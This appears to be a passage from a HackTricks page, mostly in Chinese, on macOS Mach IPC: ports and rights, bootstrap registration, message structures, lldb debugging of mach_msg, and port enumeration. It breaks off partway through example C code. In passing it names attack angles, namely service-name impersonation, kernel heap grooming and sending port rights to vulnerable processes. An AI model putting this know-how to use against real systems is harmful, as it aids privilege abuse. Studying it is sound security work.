@@ -1,0 +1,1241 @@
+<!DOCTYPE HTML>
+<html lang="zh" class="light sidebar-visible" dir="ltr">
+    <head>
+        <!-- Book generated using mdBook -->
+        <meta charset="UTF-8">
+        <title>macOS IPC - Inter Process Communication</title>
+
+
+        <!-- Custom HTML head -->
+
+        <meta name="description" content="">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="theme-color" content="#ffffff">
+
+        <link rel="icon" href="../../../../favicon.svg">
+        <link rel="shortcut icon" href="../../../../favicon.png">
+        <link rel="stylesheet" href="../../../../css/variables.css">
+        <link rel="stylesheet" href="../../../../css/general.css">
+        <link rel="stylesheet" href="../../../../css/chrome.css">
+        <link rel="stylesheet" href="../../../../css/print.css" media="print">
+
+        <!-- Fonts -->
+        <link rel="stylesheet" href="../../../../FontAwesome/css/font-awesome.css">
+        <link rel="stylesheet" href="../../../../fonts/fonts.css">
+
+        <!-- Highlight.js Stylesheets -->
+        <link rel="stylesheet" href="../../../../highlight.css">
+        <link rel="stylesheet" href="../../../../tomorrow-night.css">
+        <link rel="stylesheet" href="../../../../ayu-highlight.css">
+
+        <!-- Custom theme stylesheets -->
+
+
+        <!-- Provide site root to javascript -->
+        <script>
+            var path_to_root = "../../../../";
+            var default_theme = window.matchMedia("(prefers-color-scheme: dark)").matches ? "navy" : "light";
+        </script>
+        <!-- Start loading toc.js asap -->
+        <script src="../../../../toc.js"></script>
+    </head>
+    <body>
+    <div id="body-container">
+        <!-- Work around some values being stored in localStorage wrapped in quotes -->
+        <script>
+            try {
+                var theme = localStorage.getItem('mdbook-theme');
+                var sidebar = localStorage.getItem('mdbook-sidebar');
+
+                if (theme.startsWith('"') && theme.endsWith('"')) {
+                    localStorage.setItem('mdbook-theme', theme.slice(1, theme.length - 1));
+                }
+
+                if (sidebar.startsWith('"') && sidebar.endsWith('"')) {
+                    localStorage.setItem('mdbook-sidebar', sidebar.slice(1, sidebar.length - 1));
+                }
+            } catch (e) { }
+        </script>
+
+        <!-- Set the theme before any content is loaded, prevents flash -->
+        <script>
+            var theme;
+            try { theme = localStorage.getItem('mdbook-theme'); } catch(e) { }
+            if (theme === null || theme === undefined) { theme = default_theme; }
+            const html = document.documentElement;
+            html.classList.remove('light')
+            html.classList.add(theme);
+            html.classList.add("js");
+        </script>
+
+        <input type="checkbox" id="sidebar-toggle-anchor" class="hidden">
+
+        <!-- Hide / unhide sidebar before it is displayed -->
+        <script>
+            var sidebar = null;
+            var sidebar_toggle = document.getElementById("sidebar-toggle-anchor");
+            if (document.body.clientWidth >= 1080) {
+                try { sidebar = localStorage.getItem('mdbook-sidebar'); } catch(e) { }
+                sidebar = sidebar || 'visible';
+            } else {
+                sidebar = 'hidden';
+            }
+            sidebar_toggle.checked = sidebar === 'visible';
+            html.classList.remove('sidebar-visible');
+            html.classList.add("sidebar-" + sidebar);
+        </script>
+
+        <nav id="sidebar" class="sidebar" aria-label="Table of contents">
+            <!-- populated by js -->
+            <mdbook-sidebar-scrollbox class="sidebar-scrollbox"></mdbook-sidebar-scrollbox>
+            <noscript>
+                <iframe class="sidebar-iframe-outer" src="../../../../toc.html"></iframe>
+            </noscript>
+            <div id="sidebar-resize-handle" class="sidebar-resize-handle">
+                <div class="sidebar-resize-indicator"></div>
+            </div>
+        </nav>
+
+        <div id="page-wrapper" class="page-wrapper">
+
+            <div class="page">
+                <div id="menu-bar-hover-placeholder"></div>
+                <div id="menu-bar" class="menu-bar sticky">
+                    <div class="left-buttons">
+                        <label id="sidebar-toggle" class="icon-button" for="sidebar-toggle-anchor" title="Toggle Table of Contents" aria-label="Toggle Table of Contents" aria-controls="sidebar">
+                            <i class="fa fa-bars"></i>
+                        </label>
+                        <button id="theme-toggle" class="icon-button" type="button" title="Change theme" aria-label="Change theme" aria-haspopup="true" aria-expanded="false" aria-controls="theme-list">
+                            <i class="fa fa-paint-brush"></i>
+                        </button>
+                        <ul id="theme-list" class="theme-popup" aria-label="Themes" role="menu">
+                            <li role="none"><button role="menuitem" class="theme" id="light">Light</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="rust">Rust</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="coal">Coal</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="navy">Navy</button></li>
+                            <li role="none"><button role="menuitem" class="theme" id="ayu">Ayu</button></li>
+                        </ul>
+                        <button id="search-toggle" class="icon-button" type="button" title="Search. (Shortkey: s)" aria-label="Toggle Searchbar" aria-expanded="false" aria-keyshortcuts="S" aria-controls="searchbar">
+                            <i class="fa fa-search"></i>
+                        </button>
+                    </div>
+
+                    <h1 class="menu-title"></h1>
+
+                    <div class="right-buttons">
+                        <a href="../../../../print.html" title="Print this book" aria-label="Print this book">
+                            <i id="print-button" class="fa fa-print"></i>
+                        </a>
+
+                    </div>
+                </div>
+
+                <div id="search-wrapper" class="hidden">
+                    <form id="searchbar-outer" class="searchbar-outer">
+                        <input type="search" id="searchbar" name="searchbar" placeholder="Search this book ..." aria-controls="searchresults-outer" aria-describedby="searchresults-header">
+                    </form>
+                    <div id="searchresults-outer" class="searchresults-outer hidden">
+                        <div id="searchresults-header" class="searchresults-header"></div>
+                        <ul id="searchresults">
+                        </ul>
+                    </div>
+                </div>
+
+                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
+                <script>
+                    document.getElementById('sidebar-toggle').setAttribute('aria-expanded', sidebar === 'visible');
+                    document.getElementById('sidebar').setAttribute('aria-hidden', sidebar !== 'visible');
+                    Array.from(document.querySelectorAll('#sidebar a')).forEach(function(link) {
+                        link.setAttribute('tabIndex', sidebar === 'visible' ? 0 : -1);
+                    });
+                </script>
+
+                <div id="content" class="content">
+                    <main>
+                        <h1 id="macos-ipc---进程间通信"><a class="header" href="#macos-ipc---进程间通信">macOS IPC - 进程间通信</a></h1>
+<p>{% hint style="success" %}
+学习和实践 AWS 黑客技术：<img src="/.gitbook/assets/arte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/arte"><strong>HackTricks 培训 AWS 红队专家 (ARTE)</strong></a><img src="/.gitbook/assets/arte.png" alt="" data-size="line"><br />
+学习和实践 GCP 黑客技术：<img src="/.gitbook/assets/grte.png" alt="" data-size="line"><a href="https://training.hacktricks.xyz/courses/grte"><strong>HackTricks 培训 GCP 红队专家 (GRTE)</strong><img src="/.gitbook/assets/grte.png" alt="" data-size="line"></a></p>
+<details>
+<summary>支持 HackTricks</summary>
+<ul>
+<li>查看 <a href="https://github.com/sponsors/carlospolop"><strong>订阅计划</strong></a>!</li>
+<li><strong>加入</strong> 💬 <a href="https://discord.gg/hRep4RUj7f"><strong>Discord 群组</strong></a> 或 <a href="https://t.me/peass"><strong>Telegram 群组</strong></a> 或 <strong>关注</strong> 我们的 <strong>Twitter</strong> 🐦 <a href="https://twitter.com/hacktricks_live"><strong>@hacktricks_live</strong></a><strong>.</strong></li>
+<li><strong>通过向</strong> <a href="https://github.com/carlospolop/hacktricks"><strong>HackTricks</strong></a> 和 <a href="https://github.com/carlospolop/hacktricks-cloud"><strong>HackTricks Cloud</strong></a> GitHub 仓库提交 PR 分享黑客技巧。</li>
+</ul>
+</details>
+{% endhint %}
+<h2 id="mach-消息通过端口"><a class="header" href="#mach-消息通过端口">Mach 消息通过端口</a></h2>
+<h3 id="基本信息"><a class="header" href="#基本信息">基本信息</a></h3>
+<p>Mach 使用 <strong>任务</strong> 作为共享资源的 <strong>最小单位</strong>，每个任务可以包含 <strong>多个线程</strong>。这些 <strong>任务和线程与 POSIX 进程和线程 1:1 映射</strong>。</p>
+<p>任务之间的通信通过 Mach 进程间通信 (IPC) 进行，利用单向通信通道。<strong>消息在端口之间传输</strong>，端口充当由内核管理的 <strong>消息队列</strong>。</p>
+<p><strong>端口</strong> 是 Mach IPC 的 <strong>基本</strong> 元素。它可以用来 <strong>发送消息和接收</strong> 消息。</p>
+<p>每个进程都有一个 <strong>IPC 表</strong>，在其中可以找到 <strong>进程的 mach 端口</strong>。mach 端口的名称实际上是一个数字（指向内核对象的指针）。</p>
+<p>一个进程也可以将一个端口名称和一些权限 <strong>发送到不同的任务</strong>，内核会在 <strong>另一个任务的 IPC 表</strong> 中显示这个条目。</p>
+<h3 id="端口权限"><a class="header" href="#端口权限">端口权限</a></h3>
+<p>端口权限定义了任务可以执行的操作，是这种通信的关键。可能的 <strong>端口权限</strong> 是（<a href="https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html">定义来自这里</a>）：</p>
+<ul>
+<li><strong>接收权限</strong>，允许接收发送到端口的消息。Mach 端口是 MPSC（多个生产者，单个消费者）队列，这意味着在整个系统中每个端口只能有 <strong>一个接收权限</strong>（与管道不同，多个进程可以持有一个管道的读端文件描述符）。</li>
+<li>拥有 <strong>接收权限</strong> 的任务可以接收消息并 <strong>创建发送权限</strong>，允许其发送消息。最初只有 <strong>自己的任务对其端口拥有接收权限</strong>。</li>
+<li>如果接收权限的拥有者 <strong>死亡</strong> 或被杀死，<strong>发送权限变得无用（死名称）</strong>。</li>
+<li><strong>发送权限</strong>，允许向端口发送消息。</li>
+<li>发送权限可以被 <strong>克隆</strong>，因此拥有发送权限的任务可以克隆该权限并 <strong>授予给第三个任务</strong>。</li>
+<li>注意 <strong>端口权限</strong> 也可以通过 Mac 消息 <strong>传递</strong>。</li>
+<li><strong>一次性发送权限</strong>，允许向端口发送一条消息，然后消失。</li>
+<li>该权限 <strong>不能</strong> 被 <strong>克隆</strong>，但可以被 <strong>移动</strong>。</li>
+<li><strong>端口集权限</strong>，表示一个 <em>端口集</em> 而不是单个端口。从端口集中出队一条消息会从其包含的一个端口中出队一条消息。端口集可以用来同时监听多个端口，类似于 Unix 中的 <code>select</code>/<code>poll</code>/<code>epoll</code>/<code>kqueue</code>。</li>
+<li><strong>死名称</strong>，这不是一个实际的端口权限，而只是一个占位符。当一个端口被销毁时，所有现有的端口权限都会变成死名称。</li>
+</ul>
+<p><strong>任务可以将发送权限转移给其他任务</strong>，使其能够发送消息。<strong>发送权限也可以被克隆，因此一个任务可以复制并将权限授予第三个任务</strong>。这与一个称为 <strong>引导服务器</strong> 的中介进程结合，使任务之间的有效通信成为可能。</p>
+<h3 id="文件端口"><a class="header" href="#文件端口">文件端口</a></h3>
+<p>文件端口允许在 Mac 端口中封装文件描述符（使用 Mach 端口权限）。可以使用 <code>fileport_makeport</code> 从给定的 FD 创建一个 <code>fileport</code>，并使用 <code>fileport_makefd</code> 从 fileport 创建一个 FD。</p>
+<h3 id="建立通信"><a class="header" href="#建立通信">建立通信</a></h3>
+<p>如前所述，可以使用 Mach 消息发送权限，然而，您 <strong>不能在没有发送 Mach 消息的权限的情况下发送权限</strong>。那么，如何建立第一次通信呢？</p>
+<p>为此，<strong>引导服务器</strong>（在 mac 中为 <strong>launchd</strong>）参与其中，因为 <strong>任何人都可以获得引导服务器的发送权限</strong>，可以请求它发送消息到另一个进程的权限：</p>
+<ol>
+<li>任务 <strong>A</strong> 创建一个 <strong>新端口</strong>，获得该端口的 <strong>接收权限</strong>。</li>
+<li>任务 <strong>A</strong>，作为接收权限的持有者，<strong>为该端口生成一个发送权限</strong>。</li>
+<li>任务 <strong>A</strong> 与 <strong>引导服务器</strong> 建立 <strong>连接</strong>，并 <strong>将其为最初生成的端口发送的发送权限</strong> 发送给它。</li>
+</ol>
+<ul>
+<li>请记住，任何人都可以获得引导服务器的发送权限。</li>
+</ul>
+<ol start="4">
+<li>任务 A 向引导服务器发送 <code>bootstrap_register</code> 消息，以 <strong>将给定端口与名称关联</strong>，如 <code>com.apple.taska</code>。</li>
+<li>任务 <strong>B</strong> 与 <strong>引导服务器</strong> 交互以执行服务名称的引导 <strong>查找</strong>（<code>bootstrap_lookup</code>）。因此，引导服务器可以响应，任务 B 将在查找消息中发送 <strong>发送权限到它之前创建的端口</strong>。如果查找成功，<strong>服务器复制从任务 A 接收到的发送权限</strong> 并 <strong>将其传输给任务 B</strong>。</li>
+</ol>
+<ul>
+<li>请记住，任何人都可以获得引导服务器的发送权限。</li>
+</ul>
+<ol start="6">
+<li>通过这个发送权限，<strong>任务 B</strong> 能够 <strong>发送</strong> 一条 <strong>消息</strong> <strong>给任务 A</strong>。</li>
+<li>对于双向通信，通常任务 <strong>B</strong> 会生成一个带有 <strong>接收</strong> 权限和 <strong>发送</strong> 权限的新端口，并将 <strong>发送权限授予任务 A</strong>，以便它可以向任务 B 发送消息（双向通信）。</li>
+</ol>
+<p>引导服务器 <strong>无法验证</strong> 任务声称的服务名称。这意味着一个 <strong>任务</strong> 可能会 <strong>冒充任何系统任务</strong>，例如虚假 <strong>声称一个授权服务名称</strong>，然后批准每个请求。</p>
+<p>然后，Apple 将 <strong>系统提供服务的名称</strong> 存储在安全配置文件中，位于 <strong>SIP 保护</strong> 目录：<code>/System/Library/LaunchDaemons</code> 和 <code>/System/Library/LaunchAgents</code>。每个服务名称旁边，<strong>相关的二进制文件也被存储</strong>。引导服务器将为这些服务名称创建并持有 <strong>接收权限</strong>。</p>
+<p>对于这些预定义服务，<strong>查找过程略有不同</strong>。当查找服务名称时，launchd 动态启动该服务。新的工作流程如下：</p>
+<ul>
+<li>任务 <strong>B</strong> 启动对服务名称的引导 <strong>查找</strong>。</li>
+<li><strong>launchd</strong> 检查任务是否正在运行，如果没有，则 <strong>启动</strong> 它。</li>
+<li>任务 <strong>A</strong>（服务）执行 <strong>引导检查</strong>（<code>bootstrap_check_in()</code>）。在这里，引导服务器创建一个发送权限，保留它，并 <strong>将接收权限转移给任务 A</strong>。</li>
+<li>launchd 复制 <strong>发送权限并将其发送给任务 B</strong>。</li>
+<li>任务 <strong>B</strong> 生成一个带有 <strong>接收</strong> 权限和 <strong>发送</strong> 权限的新端口，并将 <strong>发送权限授予任务 A</strong>（服务），以便它可以向任务 B 发送消息（双向通信）。</li>
+</ul>
+<p>然而，这个过程仅适用于预定义的系统任务。非系统任务仍然按照最初描述的方式操作，这可能会导致冒充。</p>
+<p>{% hint style="danger" %}
+因此，launchd 绝不能崩溃，否则整个系统将崩溃。
+{% endhint %}</p>
+<h3 id="一个-mach-消息"><a class="header" href="#一个-mach-消息">一个 Mach 消息</a></h3>
+<p><a href="https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/">在这里找到更多信息</a></p>
+<p><code>mach_msg</code> 函数，基本上是一个系统调用，用于发送和接收 Mach 消息。该函数要求将要发送的消息作为初始参数。该消息必须以 <code>mach_msg_header_t</code> 结构开始，后面跟着实际的消息内容。该结构定义如下：</p>
+<pre><code class="language-c">typedef struct {
+mach_msg_bits_t               msgh_bits;
+mach_msg_size_t               msgh_size;
+mach_port_t                   msgh_remote_port;
+mach_port_t                   msgh_local_port;
+mach_port_name_t              msgh_voucher_port;
+mach_msg_id_t                 msgh_id;
+} mach_msg_header_t;
+</code></pre>
+<p>Processes possessing a <em><strong>receive right</strong></em> can receive messages on a Mach port. Conversely, the <strong>senders</strong> are granted a <em><strong>send</strong></em> or a <em><strong>send-once right</strong></em>. The send-once right is exclusively for sending a single message, after which it becomes invalid.</p>
+<p>The initial field <strong><code>msgh_bits</code></strong> is a bitmap:</p>
+<ul>
+<li>First bit (most significative) is used to indicate that a message is complex (more on this below)</li>
+<li>The 3rd and 4th are used by the kernel</li>
+<li>The <strong>5 least significant bits of the 2nd byte</strong> from can be used for <strong>voucher</strong>: 另一种发送键/值组合的端口类型。</li>
+<li>The <strong>5 least significant bits of the 3rd byte</strong> from can be used for <strong>local port</strong></li>
+<li>The <strong>5 least significant bits of the 4th byte</strong> from can be used for <strong>remote port</strong></li>
+</ul>
+<p>The types that can be specified in the voucher, local and remote ports are (from <a href="https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html"><strong>mach/message.h</strong></a>):</p>
+<pre><code class="language-c">#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
+#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
+#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
+#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
+#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
+#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
+#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
+#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
+#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
+#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
+</code></pre>
+<p>例如，<code>MACH_MSG_TYPE_MAKE_SEND_ONCE</code> 可用于 <strong>指示</strong> 应该为此端口派生并转移一个 <strong>一次性发送权</strong>。也可以指定 <code>MACH_PORT_NULL</code> 以防止接收者能够回复。</p>
+<p>为了实现简单的 <strong>双向通信</strong>，进程可以在 mach <strong>消息头</strong> 中指定一个 <strong>mach 端口</strong>，称为 <em>回复端口</em> (<strong><code>msgh_local_port</code></strong>)，接收该消息的 <strong>接收者</strong> 可以 <strong>发送回复</strong>。</p>
+<p>{% hint style="success" %}
+请注意，这种双向通信用于期望回复的 XPC 消息中（<code>xpc_connection_send_message_with_reply</code> 和 <code>xpc_connection_send_message_with_reply_sync</code>）。但 <strong>通常会创建不同的端口</strong>，如前所述，以创建双向通信。
+{% endhint %}</p>
+<p>消息头的其他字段包括：</p>
+<ul>
+<li><code>msgh_size</code>：整个数据包的大小。</li>
+<li><code>msgh_remote_port</code>：发送此消息的端口。</li>
+<li><code>msgh_voucher_port</code>：<a href="https://robert.sesek.com/2023/6/mach_vouchers.html">mach 代金券</a>。</li>
+<li><code>msgh_id</code>：此消息的 ID，由接收者解释。</li>
+</ul>
+<p>{% hint style="danger" %}
+请注意，<strong>mach 消息是通过 <code>mach port</code> 发送的</strong>，这是一个 <strong>单接收者</strong>、<strong>多个发送者</strong> 的通信通道，内置于 mach 内核中。<strong>多个进程</strong> 可以 <strong>向 mach 端口发送消息</strong>，但在任何时候只有 <strong>一个进程可以从中读取</strong>。
+{% endhint %}</p>
+<p>消息由 <strong><code>mach_msg_header_t</code></strong> 头部、<strong>主体</strong> 和 <strong>尾部</strong>（如果有的话）组成，并且可以授予回复的权限。在这些情况下，内核只需将消息从一个任务传递到另一个任务。</p>
+<p><strong>尾部</strong> 是 <strong>内核添加到消息中的信息</strong>（用户无法设置），可以在消息接收时通过标志 <code>MACH_RCV_TRAILER_&lt;trailer_opt&gt;</code> 请求（可以请求不同的信息）。</p>
+<h4 id="复杂消息"><a class="header" href="#复杂消息">复杂消息</a></h4>
+<p>然而，还有其他更 <strong>复杂</strong> 的消息，例如传递额外端口权或共享内存的消息，在这些情况下，内核还需要将这些对象发送给接收者。在这种情况下，头部的最显著位 <code>msgh_bits</code> 被设置。</p>
+<p>可以传递的描述符在 <a href="https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html"><strong><code>mach/message.h</code></strong></a> 中定义：</p>
+<pre><code class="language-c">#define MACH_MSG_PORT_DESCRIPTOR                0
+#define MACH_MSG_OOL_DESCRIPTOR                 1
+#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
+#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
+#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4
+
+#pragma pack(push, 4)
+
+typedef struct{
+natural_t                     pad1;
+mach_msg_size_t               pad2;
+unsigned int                  pad3 : 24;
+mach_msg_descriptor_type_t    type : 8;
+} mach_msg_type_descriptor_t;
+</code></pre>
+<p>在32位中，所有描述符都是12B，描述符类型在第11个。在64位中，大小各不相同。</p>
+<p>{% hint style="danger" %}
+内核会将描述符从一个任务复制到另一个任务，但首先<strong>在内核内存中创建一个副本</strong>。这种技术被称为“风水”，在多个漏洞中被滥用，使得<strong>内核在其内存中复制数据</strong>，使得一个进程将描述符发送给自己。然后该进程可以接收消息（内核会释放它们）。</p>
+<p>也可以<strong>将端口权限发送给一个易受攻击的进程</strong>，端口权限将直接出现在该进程中（即使它没有处理这些权限）。
+{% endhint %}</p>
+<h3 id="mac-ports-apis"><a class="header" href="#mac-ports-apis">Mac Ports APIs</a></h3>
+<p>请注意，端口与任务命名空间相关，因此要创建或搜索端口时，也会查询任务命名空间（更多内容见<code>mach/mach_port.h</code>）：</p>
+<ul>
+<li><strong><code>mach_port_allocate</code> | <code>mach_port_construct</code></strong>: <strong>创建</strong>一个端口。</li>
+<li><code>mach_port_allocate</code> 还可以创建一个<strong>端口集</strong>：对一组端口的接收权限。每当接收到消息时，会指明消息来自哪个端口。</li>
+<li><code>mach_port_allocate_name</code>: 更改端口的名称（默认是32位整数）</li>
+<li><code>mach_port_names</code>: 从目标获取端口名称</li>
+<li><code>mach_port_type</code>: 获取任务对名称的权限</li>
+<li><code>mach_port_rename</code>: 重命名端口（类似于FD的dup2）</li>
+<li><code>mach_port_allocate</code>: 分配一个新的RECEIVE、PORT_SET或DEAD_NAME</li>
+<li><code>mach_port_insert_right</code>: 在你拥有RECEIVE的端口中创建一个新的权限</li>
+<li><code>mach_port_...</code></li>
+<li><strong><code>mach_msg</code></strong> | <strong><code>mach_msg_overwrite</code></strong>: 用于<strong>发送和接收mach消息</strong>的函数。覆盖版本允许为消息接收指定不同的缓冲区（另一个版本将仅重用它）。</li>
+</ul>
+<h3 id="调试-mach_msg"><a class="header" href="#调试-mach_msg">调试 mach_msg</a></h3>
+<p>由于**<code>mach_msg</code><strong>和</strong><code>mach_msg_overwrite</code>**是用于发送和接收消息的函数，因此在它们上设置断点将允许检查发送和接收的消息。</p>
+<p>例如，开始调试任何你可以调试的应用程序，因为它将加载**<code>libSystem.B</code>，该库将使用此函数**。</p>
+<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
+</strong>断点 1: 位置 = libsystem_kernel.dylib`mach_msg, 地址 = 0x00000001803f6c20
+<strong>(lldb) r
+</strong>进程 71019 启动: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
+进程 71019 停止
+* 线程 #1, 队列 = 'com.apple.main-thread', 停止原因 = 断点 1.1
+帧 #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
+libsystem_kernel.dylib`mach_msg:
+->  0x181d3ac20 &#x3C;+0>:  pacibsp
+0x181d3ac24 &#x3C;+4>:  sub    sp, sp, #0x20
+0x181d3ac28 &#x3C;+8>:  stp    x29, x30, [sp, #0x10]
+0x181d3ac2c &#x3C;+12>: add    x29, sp, #0x10
+目标 0: (SandboxedShellApp) 停止。
+<strong>(lldb) bt
+</strong>* 线程 #1, 队列 = 'com.apple.main-thread', 停止原因 = 断点 1.1
+* 帧 #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
+帧 #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
+帧 #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
+帧 #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
+帧 #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
+帧 #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
+帧 #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
+帧 #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
+帧 #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
+帧 #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&#x26;) const::$_0::operator()() const + 168
+</code></pre>
+<p>要获取**<code>mach_msg</code>**的参数，请检查寄存器。这些是参数（来自<a href="https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html">mach/message.h</a>）：</p>
+<pre><code class="language-c">__WATCHOS_PROHIBITED __TVOS_PROHIBITED
+extern mach_msg_return_t        mach_msg(
+mach_msg_header_t *msg,
+mach_msg_option_t option,
+mach_msg_size_t send_size,
+mach_msg_size_t rcv_size,
+mach_port_name_t rcv_name,
+mach_msg_timeout_t timeout,
+mach_port_name_t notify);
+</code></pre>
+<p>获取注册表中的值：</p>
+<pre><code class="language-armasm">reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
+x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
+x1 = 0x0000000003114207 ;mach_msg_option_t (option)
+x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
+x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
+x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
+x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
+x6 = 0x0000000000000000 ;mach_port_name_t (notify)
+</code></pre>
+<p>检查消息头，查看第一个参数：</p>
+<pre><code class="language-armasm">(lldb) x/6w $x0
+0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
+0x124e04cf8: 0x00000b07 0x40000322
+
+; 0x00131513 -&gt; mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
+; 0x00000388 -&gt; mach_msg_size_t (msgh_size)
+; 0x00000807 -&gt; mach_port_t (msgh_remote_port)
+; 0x00001f03 -&gt; mach_port_t (msgh_local_port)
+; 0x00000b07 -&gt; mach_port_name_t (msgh_voucher_port)
+; 0x40000322 -&gt; mach_msg_id_t (msgh_id)
+</code></pre>
+<p>该类型的 <code>mach_msg_bits_t</code> 非常常见，允许回复。</p>
+<h3 id="枚举端口"><a class="header" href="#枚举端口">枚举端口</a></h3>
+<pre><code class="language-bash">lsmp -p &lt;pid&gt;
+
+sudo lsmp -p 1
+Process (1) : launchd
+name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
+---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
+0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
+0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
+0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
+0x0000051b  0x1840cf3d  send        --------        ---            2        -&gt;        6         0  0x0000000000000000 0x00011817  (380) WindowServer
+0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
+0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
+0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
+0x0000091b  0x192c71fd  send        --------        D--            1        -&gt;        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
+0x00000a6b  0x1d4a18cd  send        --------        ---            2        -&gt;       16         0  0x0000000000000000 0x00006a03  (92247) Dock
+0x00000b03  0x175a5d4d  send        --------        ---            2        -&gt;       16         0  0x0000000000000000 0x00001803  (310) logd
+[...]
+0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
++     send        --------        ---            1         &lt;-                                       0x00002d03  (81948) seserviced
++     send        --------        ---            1         &lt;-                                       0x00002603  (74295) passd
+[...]
+</code></pre>
+<p>The <strong>name</strong> 是分配给端口的默认名称（检查它在前3个字节中的 <strong>增加</strong> 情况）。 <strong><code>ipc-object</code></strong> 是端口的 <strong>混淆</strong> 唯一 <strong>标识符</strong>。<br />
+还要注意，只有 <strong><code>send</code></strong> 权限的端口是 <strong>识别其所有者</strong> 的（端口名称 + pid）。<br />
+还要注意使用 <strong><code>+</code></strong> 来表示 <strong>连接到同一端口的其他任务</strong>。</p>
+<p>还可以使用 <a href="https://www.newosxbook.com/tools/procexp.html"><strong>procesxp</strong></a> 来查看 <strong>注册的服务名称</strong>（由于需要 <code>com.apple.system-task-port</code>，因此禁用 SIP）：</p>
+<pre><code>procesp 1 ports
+</code></pre>
+<p>您可以通过从 <a href="http://newosxbook.com/tools/binpack64-256.tar.gz">http://newosxbook.com/tools/binpack64-256.tar.gz</a> 下载此工具来安装它。</p>
+<h3 id="代码示例"><a class="header" href="#代码示例">代码示例</a></h3>
+<p>注意 <strong>发送者</strong> 如何 <strong>分配</strong> 一个端口，为名称 <code>org.darlinghq.example</code> 创建一个 <strong>发送权限</strong> 并将其发送到 <strong>引导服务器</strong>，同时发送者请求该名称的 <strong>发送权限</strong> 并使用它来 <strong>发送消息</strong>。</p>
+<p>{% tabs %}
+{% tab title="receiver.c" %}</p>
+<pre><code class="language-c">// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
+// gcc receiver.c -o receiver
+
+#include &lt;stdio.h&gt;
+#include &lt;mach/mach.h&gt;
+#include &lt;servers/bootstrap.h&gt;
+
+int main() {
+
+// Create a new port.
+mach_port_t port;
+kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &amp;port);
+if (kr != KERN_SUCCESS) {
+printf("mach_port_allocate() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("mach_port_allocate() created port right name %d\n", port);
+
+
+// Give us a send right to this port, in addition to the receive right.
+kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
+if (kr != KERN_SUCCESS) {
+printf("mach_port_insert_right() failed with code 0x%x\n", kr);
+return 1;
+}
+printf("mach_port_insert_right() inserted a send right\n");
+
+
+// Send the send right to the bootstrap server, so that it can be looked up by other processes.
